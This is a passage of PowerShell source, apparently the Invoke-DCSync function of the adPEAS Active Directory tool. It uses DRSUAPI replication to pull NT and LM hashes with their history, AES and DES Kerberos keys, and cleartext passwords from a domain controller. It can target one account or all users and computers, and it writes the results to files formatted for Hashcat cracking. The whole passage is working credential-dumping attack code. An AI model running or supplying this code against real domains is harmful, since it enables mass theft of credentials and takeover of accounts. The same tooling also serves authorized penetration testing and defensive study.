        [Parameter(Mandatory=$false)]
        [switch]$JustLM,

        [Parameter(Mandatory=$false)]
        [switch]$JustCleartext,

        [Parameter(Mandatory=$false)]
        [switch]$IncludeHistory,

        [Parameter(Mandatory=$false)]
        [switch]$AllAccounts,

        [Parameter(Mandatory=$false)]
        [switch]$UsersOnly,

        [Parameter(Mandatory=$false)]
        [switch]$ComputersOnly,

        [Parameter(Mandatory=$false)]
        [switch]$EnabledOnly,

        [Parameter(Mandatory=$false)]
        [string]$OutputFile
    )

    begin {
        Write-Log "[Invoke-DCSync] Starting DCSync replication"
    }

    process {
        # Validate mutually exclusive output format parameters
        $outputFormats = @($JustNTHash, $JustAES, $JustLM, $JustCleartext)
        $selectedFormats = ($outputFormats | Where-Object { $_ }).Count
        if ($selectedFormats -gt 1) {
            Show-Line "DCSync failed: Only one output format can be specified at a time" -Class Finding
            Show-Line "Choose one: -JustNTHash, -JustAES, -JustLM, or -JustCleartext" -Class Note
            return [PSCustomObject]@{
                PSTypeName = 'adPEAS.DCSync.Result'
                Success    = $false
                Error      = "Multiple output formats specified (mutually exclusive)"
            }
        }

        # Validate mutually exclusive account type parameters
        $accountTypes = @($AllAccounts, $UsersOnly, $ComputersOnly)
        $selectedTypes = ($accountTypes | Where-Object { $_ }).Count
        if ($selectedTypes -gt 1) {
            Show-Line "DCSync failed: Only one account type can be specified at a time" -Class Finding
            Show-Line "Choose one: -AllAccounts, -UsersOnly, or -ComputersOnly" -Class Note
            return [PSCustomObject]@{
                PSTypeName = 'adPEAS.DCSync.Result'
                Success    = $false
                Error      = "Multiple account types specified (mutually exclusive)"
            }
        }

        # Load C# interop if not already loaded
        if (-not ([System.Management.Automation.PSTypeName]'adPEAS.DCSyncInterop').Type) {
            try {
                Add-Type -TypeDefinition $Script:DCSyncCode -Language CSharp -ErrorAction Stop
                Write-Log "[Invoke-DCSync] C# interop compiled successfully"
            }
            catch {
                if ($_.Exception.Message -notmatch 'already exists') {
                    Show-Line "DCSync failed: Could not compile C# interop code" -Class Finding
                    return [PSCustomObject]@{
                        PSTypeName = 'adPEAS.DCSync.Result'
                        Success    = $false
                        Error      = "Failed to compile DCSync interop code: $($_.Exception.Message)"
                    }
                }
            }
        }

        # Auto-detect Domain from session if not specified
        if (-not $Domain) {
            if ($Script:LDAPContext -and $Script:LDAPContext['Domain']) {
                $Domain = $Script:LDAPContext['Domain']
                Write-Log "[Invoke-DCSync] Using session domain: $Domain"
            }
            else {
                Show-Line "DCSync failed: No domain specified and no active adPEAS session found." -Class Finding
                Show-Line "Please specify -Domain parameter or run Connect-adPEAS first." -Class Note
                return [PSCustomObject]@{
                    PSTypeName = 'adPEAS.DCSync.Result'
                    Success    = $false
                    Error      = "No domain specified and no active adPEAS session found."
                }
            }
        }

        # Auto-detect Server if not specified
        if (-not $Server) {
            # Try to get from session first
            if ($Script:LDAPContext -and $Script:LDAPContext['Server']) {
                $Server = $Script:LDAPContext['Server']
                Write-Log "[Invoke-DCSync] Using session DC: $Server"
            }
            else {
                # No session - use Resolve-adPEASName for DC discovery
                Write-Log "[Invoke-DCSync] No session found, discovering DC for domain: $Domain"
                $dcResult = Resolve-adPEASName -Domain $Domain

                if ($dcResult -and $dcResult.Hostname) {
                    $Server = $dcResult.Hostname
                    Write-Log "[Invoke-DCSync] Auto-discovered DC: $Server (IP: $($dcResult.IP))"
                }
                else {
                    Show-Line "DCSync failed: Could not locate reachable Domain Controller for domain '$Domain'" -Class Finding
                    Show-Line "Verify domain name and network connectivity (Port 88 + 389/636)" -Class Note
                    return [PSCustomObject]@{
                        PSTypeName = 'adPEAS.DCSync.Result'
                        Success    = $false
                        Error      = "Could not locate reachable Domain Controller for domain '$Domain'"
                        Domain     = $Domain
                    }
                }
            }
        }

        # ===== Authentication Validation =====
        # DCSync uses RPC (DRSUAPI) which requires Kerberos or NTLM credentials.
        # We need to validate that appropriate credentials are available BEFORE attempting RPC binding.

        $AuthUser = $null
        $AuthDomain = $null
        $AuthPassword = $null

        if ($Credential) {
            # Explicit credentials provided - extract for RPC
            $netCred = $Credential.GetNetworkCredential()
            $AuthUser = $netCred.UserName
            $AuthDomain = if ($netCred.Domain) { $netCred.Domain } else { $Domain }
            $AuthPassword = $netCred.Password
            Write-Log "[Invoke-DCSync] Using explicit credentials for: $AuthDomain\$AuthUser"
        }
        else {
            # No explicit credentials - check if we can use session or current context
            if ($Script:LDAPContext -and $Script:LDAPContext['AuthMethod']) {
                $SessionAuthMethod = $Script:LDAPContext['AuthMethod']

                # RPC (DRSUAPI) works with these auth methods:
                # - Kerberos (TGT in LSA cache from PTT)
                # - WindowsSSPI (Windows SSPI provides Kerberos/NTLM)
                # - WindowsAuth (same as WindowsSSPI)
                # - NTLM Impersonation (runas /netonly sets network credentials)
                #
                # RPC does NOT work with:
                # - SimpleBind (LDAP-only credentials, no Windows session)
                # - Schannel (TLS client cert, no Kerberos/NTLM)

                $validAuthMethods = @('Kerberos', 'WindowsSSPI', 'WindowsAuth', 'NTLM Impersonation')

                if ($SessionAuthMethod -in $validAuthMethods) {
                    # Session has compatible auth - RPC will use it via NULL identity (IntPtr.Zero)
                    Write-Log "[Invoke-DCSync] Using session authentication: $SessionAuthMethod"
                }
                else {
                    # Session has incompatible auth (SimpleBind/Schannel) - warn and try current user context
                    Show-Line "Warning: Current session uses $SessionAuthMethod (incompatible with RPC)" -Class Hint
                    Show-Line "DCSync will attempt to use current Windows user context instead" -Class Note
                    Show-Line "If this fails, provide explicit credentials via -Credential parameter" -Class Note
                    Write-Log "[Invoke-DCSync] Session auth '$SessionAuthMethod' incompatible with RPC, falling back to current user context"
                }
            }
            else {
                # No session - use current Windows user context
                Show-Line "No adPEAS session found - using current Windows user context for DCSync" -Class Note
                Show-Line "Authentication: Current logged-on user ($env:USERDOMAIN\$env:USERNAME)" -Class Note
                Show-Line "If access is denied, provide credentials via -Credential parameter" -Class Hint
                Write-Log "[Invoke-DCSync] No session found, using current Windows user context"
            }
        }

        # Parse Identity to determine if it's a GUID, SID, DN, or sAMAccountName
        $targetUser = $null
        $targetGuid = $null

        if ($Identity -match '^[0-9a-fA-F]{8}-([0-9a-fA-F]{4}-){3}[0-9a-fA-F]{12}$') {
            # GUID format
            $targetGuid = $Identity
            Write-Log "[Invoke-DCSync] Target GUID: $targetGuid"
        }
        elseif ($Identity -match '^S-1-[0-59]-\d+') {
            # SID format - convert to sAMAccountName via ConvertFrom-SID
            $resolvedName = ConvertFrom-SID -SID $Identity
            if ($resolvedName -and $resolvedName -ne $Identity) {
                # Extract just the account name (remove domain\ prefix if present)
                $targetUser = if ($resolvedName -match '\\(.+)$') { $Matches[1] } else { $resolvedName }
                Write-Log "[Invoke-DCSync] Resolved SID $Identity to: $targetUser"
            }
            else {
                Show-Line "DCSync failed: Could not resolve SID '$Identity' to an account name" -Class Finding
                return [PSCustomObject]@{
                    PSTypeName       = 'adPEAS.DCSync.Result'
                    Success          = $false
                    Error            = "Could not resolve SID '$Identity' to an account name"
                    Domain           = $Domain
                    DomainController = $Server
                }
            }
        }
        else {
            # sAMAccountName or DN - let C# handle it
            $targetUser = $Identity
            Write-Log "[Invoke-DCSync] Target user: $targetUser"
        }

        Write-Log "[Invoke-DCSync] Domain: $Domain"
        Write-Log "[Invoke-DCSync] DC: $Server"
        Write-Log "[Invoke-DCSync] Auth: $(if ($AuthUser) { "$AuthDomain\$AuthUser" } else { 'Current session (Negotiate)' })"

        # Initialize output file collection (function-local scope)
        $OutputFileContent = @()

        # Determine if we need to query accounts via LDAP first
        $accountsToSync = @()

        if ($AllAccounts -or $UsersOnly -or $ComputersOnly -or $EnabledOnly) {
            # Build connection parameters hashtable for reuse across all Get-Domain* calls
            $connectionParams = @{
                Domain = $Domain
                Server = $Server
            }
            if ($Credential) {
                $connectionParams['Credential'] = $Credential
            }

            if (-not (Ensure-LDAPConnection @connectionParams)) {
                Show-Line "DCSync failed: Could not establish LDAP connection for account enumeration" -Class Finding
                return [PSCustomObject]@{
                    PSTypeName = 'adPEAS.DCSync.Result'
                    Success    = $false
                    Error      = "Could not establish LDAP connection for account enumeration"
                    Domain     = $Domain
                }
            }

            # Query accounts using Get-DomainUser or Get-DomainComputer
            try {
                $accounts = @()

                if ($UsersOnly) {
                    Write-Log "[Invoke-DCSync] Querying users$(if ($EnabledOnly) { ' (enabled only)' })"
                    $userParams = @{ Enabled = $EnabledOnly }
                    $userParams += $connectionParams
                    $accounts = Get-DomainUser @userParams
                }
                elseif ($ComputersOnly) {
                    Write-Log "[Invoke-DCSync] Querying computers$(if ($EnabledOnly) { ' (enabled only)' })"
                    $computerParams = @{ Enabled = $EnabledOnly }
                    $computerParams += $connectionParams
                    $accounts = Get-DomainComputer @computerParams
                }
                else {
                    # AllAccounts - query both users and computers
                    Write-Log "[Invoke-DCSync] Querying all accounts (users + computers)$(if ($EnabledOnly) { ' (enabled only)' })"
                    $userParams = @{ Enabled = $EnabledOnly }
                    $userParams += $connectionParams
                    $users = Get-DomainUser @userParams

                    $computerParams = @{ Enabled = $EnabledOnly }
                    $computerParams += $connectionParams
                    $computers = Get-DomainComputer @computerParams

                    $accounts = @($users) + @($computers)
                }

                if ($accounts) {
                    $accountsToSync = $accounts | ForEach-Object {
                        if ($_.sAMAccountName) {
                            $_.sAMAccountName
                        }
                    } | Where-Object { $_ }

                    Write-Log "[Invoke-DCSync] Found $($accountsToSync.Count) accounts to replicate"
                }
                else {
                    Show-Line "No accounts found matching the specified criteria" -Class Hint
                    return
                }
            }
            catch {
                Show-Line "DCSync failed: Could not query accounts - $($_.Exception.Message)" -Class Finding
                return [PSCustomObject]@{
                    PSTypeName       = 'adPEAS.DCSync.Result'
                    Success          = $false
                    Error            = "Could not query accounts: $($_.Exception.Message)"
                    Domain           = $Domain
                    DomainController = $Server
                }
            }
        }
        else {
            # Single account mode
            $accountsToSync = @($targetUser)
        }

        # Replicate each account
        $allResults = @()
        $currentAccount = 0

        foreach ($accountName in $accountsToSync) {
            $currentAccount++

            if ($accountsToSync.Count -gt 1) {
                Write-Log "[Invoke-DCSync] Replicating account $currentAccount/$($accountsToSync.Count): $accountName"
            }

            # Call C# interop
            Write-Log "[Invoke-DCSync] Initiating DRSUAPI replication for: $accountName"
            $rpcResult = [adPEAS.DCSyncInterop]::GetReplicationData(
                $Server,
                $Domain,
                $accountName,
                $null,  # GUID only used in single-account mode
                $AuthUser,
                $AuthDomain,
                $AuthPassword,
                $false,  # forceNtlm - always use Negotiate
                $false,  # allUsers - we handle iteration in PowerShell
                "ldap"   # altService - always use ldap
            )

            if (-not $rpcResult.Success) {
                Write-Log "[Invoke-DCSync] Replication failed for $accountName : $($rpcResult.Error)"
                # Log error but continue with next account in multi-account mode
                Show-Line "DCSync failed for $accountName : $($rpcResult.Error)" -Class Finding

                if ($accountsToSync.Count -eq 1) {
                    # Single account mode - return error object
                    return [PSCustomObject]@{
                        PSTypeName       = 'adPEAS.DCSync.Result'
                        Success          = $false
                        Error            = $rpcResult.Error
                        Domain           = $Domain
                        DomainController = $Server
                        SAMAccountName   = $accountName
                    }
                }
                else {
                    # Multi-account mode - continue with next account
                    continue
                }
            }

            # Process each replicated user from this RPC call
            foreach ($userData in $rpcResult.Users) {
            # Skip if no data
            if (-not $userData.SAMAccountName -and -not $userData.ObjectSID) {
                continue
            }


            # Extract RID and SID string from objectSID bytes
            $objectSIDString = $null
            $rid = $null
            if ($userData.ObjectSID) {
                try {
                    $sid = New-Object System.Security.Principal.SecurityIdentifier($userData.ObjectSID, 0)
                    $objectSIDString = $sid.Value
                    # Extract RID (last component)
                    $ridMatch = $objectSIDString -match '-(\d+)$'
                    if ($ridMatch) {
                        $rid = [uint32]$Matches[1]
                    }
                }
                catch {
                    Write-Log "[DCSync] Could not parse SID bytes"
                }
            }

            # Layer 2: RID-based DES decryption of hashes
            $ntHash = $null
            $lmHash = $null
            $ntHashHistory = @()
            $lmHashHistory = @()

            if ($userData.UnicodePassword -and $userData.ObjectSID) {
                $decryptedHash = [adPEAS.DCSyncInterop]::DecryptHashWithRID($userData.UnicodePassword, $userData.ObjectSID)
                if ($decryptedHash) {
                    $ntHash = [BitConverter]::ToString($decryptedHash).Replace('-','').ToLower()
                }
            }

            if ($userData.LMPassword -and $userData.ObjectSID) {
                $decryptedLM = [adPEAS.DCSyncInterop]::DecryptHashWithRID($userData.LMPassword, $userData.ObjectSID)
                if ($decryptedLM) {
                    $lmHash = [BitConverter]::ToString($decryptedLM).Replace('-','').ToLower()
                }
            }

            # NT hash history (each 16 bytes)
            if ($userData.NTPasswordHistory -and $userData.ObjectSID) {
                $histLen = $userData.NTPasswordHistory.Length
                for ($hIdx = 0; $hIdx -lt $histLen; $hIdx += 16) {
                    if (($hIdx + 16) -le $histLen) {
                        $histBlock = New-Object byte[] 16
                        [Array]::Copy($userData.NTPasswordHistory, $hIdx, $histBlock, 0, 16)
                        $decHist = [adPEAS.DCSyncInterop]::DecryptHashWithRID($histBlock, $userData.ObjectSID)
                        if ($decHist) {
                            $ntHashHistory += [BitConverter]::ToString($decHist).Replace('-','').ToLower()
                        }
                    }
                }
            }

            # LM hash history
            if ($userData.LMPasswordHistory -and $userData.ObjectSID) {
                $histLen = $userData.LMPasswordHistory.Length
                for ($hIdx = 0; $hIdx -lt $histLen; $hIdx += 16) {
                    if (($hIdx + 16) -le $histLen) {
                        $histBlock = New-Object byte[] 16
                        [Array]::Copy($userData.LMPasswordHistory, $hIdx, $histBlock, 0, 16)

                        # Check if encrypted block is all zeros (empty slot in history)
                        $isEmptySlot = ($histBlock | Where-Object { $_ -ne 0 }).Count -eq 0
                        if ($isEmptySlot) {
                            continue
                        }

                        $decHist = [adPEAS.DCSyncInterop]::DecryptHashWithRID($histBlock, $userData.ObjectSID)
                        if ($decHist) {
                            $lmHashHistory += [BitConverter]::ToString($decHist).Replace('-','').ToLower()
                        }
                    }
                }
            }

            # JustNTHash mode - output clean object with NT hash only
            if ($JustNTHash) {
                $ntHashOutput = [PSCustomObject]@{
                    SAMAccountName = $userData.SAMAccountName
                    NTHash         = $ntHash
                }

                # Add NT hash history if requested and present
                if ($IncludeHistory -and $ntHashHistory -and $ntHashHistory.Count -gt 0) {
                    $ntHashOutput | Add-Member -NotePropertyName "NTHashHistory" -NotePropertyValue $ntHashHistory
                }

                # Export to Hashcat format if requested
                if ($OutputFile -and $ntHash) {
                    $OutputFileContent += "$($userData.SAMAccountName):$ntHash"

                    # Add history hashes if present
                    if ($IncludeHistory -and $ntHashHistory -and $ntHashHistory.Count -gt 0) {
                        for ($i = 0; $i -lt $ntHashHistory.Count; $i++) {
                            $OutputFileContent += "$($userData.SAMAccountName)_history$($i+1):$($ntHashHistory[$i])"
                        }
                    }
                }

                Write-Output $ntHashOutput
                continue
            }

            # Layer 3: Parse supplementalCredentials
            $aes256Key = $null
            $aes128Key = $null
            $desKey = $null
            $kerberosSalt = $null
            $cleartextPassword = $null
            $wdigestHashes = @()

            if ($userData.SupplementalCredentials) {
                $suppCreds = ConvertFrom-SupplementalCredentials -Data $userData.SupplementalCredentials
                if ($suppCreds) {
                    $aes256Key = $suppCreds.AES256Key
                    $aes128Key = $suppCreds.AES128Key
                    $desKey = $suppCreds.DESKey
                    $kerberosSalt = $suppCreds.KerberosSalt
                    $cleartextPassword = $suppCreds.CleartextPassword
                    $wdigestHashes = $suppCreds.WDigestHashes
                }
            }

            # Convert timestamps
            $pwdLastSetDT = $null
            $accountExpiresDT = $null

            if ($userData.PwdLastSet -ne 0 -and $userData.PwdLastSet -ne [Int64]::MaxValue) {
                try {
                    $pwdLastSetDT = [DateTime]::FromFileTime($userData.PwdLastSet)
                }
                catch {
                    Write-Log "[DCSync] Failed to convert pwdLastSet timestamp: $($_.Exception.Message)"
                    $pwdLastSetDT = $null
                }
            }
            if ($userData.AccountExpires -ne 0 -and $userData.AccountExpires -ne [Int64]::MaxValue) {
                try {
                    $accountExpiresDT = [DateTime]::FromFileTime($userData.AccountExpires)
                }
                catch {
                    Write-Log "[DCSync] Failed to convert accountExpires timestamp: $($_.Exception.Message)"
                    $accountExpiresDT = $null
                }
            }
            elseif ($userData.AccountExpires -eq [Int64]::MaxValue -or $userData.AccountExpires -eq 0) {
                $accountExpiresDT = $null  # Never expires
            }

                # JustAES mode - only output AES keys
                if ($JustAES) {
                    if ($aes256Key -or $aes128Key) {
                        $aesOutput = [PSCustomObject]@{
                            SAMAccountName = $userData.SAMAccountName
                            AES256Key      = $aes256Key
                            AES128Key      = $aes128Key
                        }

                        # Export to Hashcat format if requested
                        if ($OutputFile) {
                            if ($aes256Key) {
                                $OutputFileContent += "$($userData.SAMAccountName):$aes256Key"
                            }
                            if ($aes128Key) {
                                $OutputFileContent += "$($userData.SAMAccountName):$aes128Key"
                            }
                        }

                        Write-Output $aesOutput
                    }
                    continue
                }

                # JustLM mode - only output LM hash
                if ($JustLM) {
                    $lmOutput = [PSCustomObject]@{
                        SAMAccountName = $userData.SAMAccountName
                        LMHash         = $lmHash
                    }

                    # Add LM hash history if requested and present
                    if ($IncludeHistory -and $lmHashHistory -and $lmHashHistory.Count -gt 0) {
                        $lmOutput | Add-Member -NotePropertyName "LMHashHistory" -NotePropertyValue $lmHashHistory
                    }

                    # Export to Hashcat format if requested
                    if ($OutputFile -and $lmHash) {
                        $OutputFileContent += "$($userData.SAMAccountName):$lmHash"

                        # Add history hashes if present
                        if ($IncludeHistory -and $lmHashHistory -and $lmHashHistory.Count -gt 0) {
                            for ($i = 0; $i -lt $lmHashHistory.Count; $i++) {
                                $OutputFileContent += "$($userData.SAMAccountName)_history$($i+1):$($lmHashHistory[$i])"
                            }
                        }
                    }

                    Write-Output $lmOutput
                    continue
                }

                # JustCleartext mode - only output cleartext password
                if ($JustCleartext) {
                    $cleartextOutput = [PSCustomObject]@{
                        SAMAccountName    = $userData.SAMAccountName
                        CleartextPassword = $cleartextPassword
                    }

                    # Export to file if requested (format: username:cleartext)
                    if ($OutputFile -and $cleartextPassword) {
                        $OutputFileContent += "$($userData.SAMAccountName):$cleartextPassword"
                    }

                    Write-Output $cleartextOutput
                    continue
                }

                # Build result object
                $resultObj = [PSCustomObject]@{
                    PSTypeName             = 'adPEAS.DCSync.Result'
                    Success                = $true
                    Domain                 = $Domain
                    DomainController       = $Server
                    SAMAccountName         = $userData.SAMAccountName
                    UserPrincipalName      = $userData.UserPrincipalName
                    DisplayName            = $userData.DisplayName
                    ObjectSID              = $objectSIDString
                    RID                    = $rid
                    UserAccountControl     = $userData.UserAccountControl
                    SAMAccountType         = $userData.SAMAccountType
                    PwdLastSet             = $pwdLastSetDT
                    AccountExpires         = $accountExpiresDT
                    NTHash                 = $ntHash
                    LMHash                 = $lmHash
                    AES256Key              = $aes256Key
                    AES128Key              = $aes128Key
                    DESKey                 = $desKey
                    KerberosSalt           = $kerberosSalt
                    CleartextPassword      = $cleartextPassword
                    WDigestHashes          = $wdigestHashes
                    SupplementalCredentials = $userData.SupplementalCredentials
                    Message                = "DCSync successful for $($userData.SAMAccountName)"
                    Error                  = $null
                }

                # Add history properties only if requested and present
                if ($IncludeHistory) {
                    if ($ntHashHistory -and $ntHashHistory.Count -gt 0) {
                        $resultObj | Add-Member -NotePropertyName "NTHashHistory" -NotePropertyValue $ntHashHistory
                    }
                    if ($lmHashHistory -and $lmHashHistory.Count -gt 0) {
                        $resultObj | Add-Member -NotePropertyName "LMHashHistory" -NotePropertyValue $lmHashHistory
                    }
                }

                # Export to file if requested (normal mode - all hashes)
                if ($OutputFile) {
                    # NT hash
                    if ($ntHash) {
                        $OutputFileContent += "$($userData.SAMAccountName):$ntHash"

                        # NT hash history if present
                        if ($IncludeHistory -and $ntHashHistory -and $ntHashHistory.Count -gt 0) {
                            for ($i = 0; $i -lt $ntHashHistory.Count; $i++) {
                                $OutputFileContent += "$($userData.SAMAccountName)_nt_history$($i+1):$($ntHashHistory[$i])"
                            }
                        }
                    }

                    # LM hash
                    if ($lmHash) {
                        $OutputFileContent += "$($userData.SAMAccountName)_lm:$lmHash"

                        # LM hash history if present
                        if ($IncludeHistory -and $lmHashHistory -and $lmHashHistory.Count -gt 0) {
                            for ($i = 0; $i -lt $lmHashHistory.Count; $i++) {
                                $OutputFileContent += "$($userData.SAMAccountName)_lm_history$($i+1):$($lmHashHistory[$i])"
                            }
                        }
                    }

                    # AES256 key
                    if ($aes256Key) {
                        $OutputFileContent += "$($userData.SAMAccountName)_aes256:$aes256Key"
                    }

                    # AES128 key
                    if ($aes128Key) {
                        $OutputFileContent += "$($userData.SAMAccountName)_aes128:$aes128Key"
                    }

                    # Cleartext password
                    if ($cleartextPassword) {
                        $OutputFileContent += "$($userData.SAMAccountName)_cleartext:$cleartextPassword"
                    }
                }

                # Collect result
                $allResults += $resultObj
                Write-Output $resultObj
            }  # End foreach ($userData in $rpcResult.Users)
        }  # End foreach ($accountName in $accountsToSync)

        # Write output file if requested
        if ($OutputFile -and $OutputFileContent.Count -gt 0) {
            try {
                $OutputFileContent | Out-File -FilePath $OutputFile -Force -Encoding ASCII
                Show-Line "Exported $($OutputFileContent.Count) entries to: $OutputFile" -Class Note
            }
            catch {
                Show-Line "Failed to write output file: $($_.Exception.Message)" -Class Finding
            }
        }
    }  # End process block
}  # End function
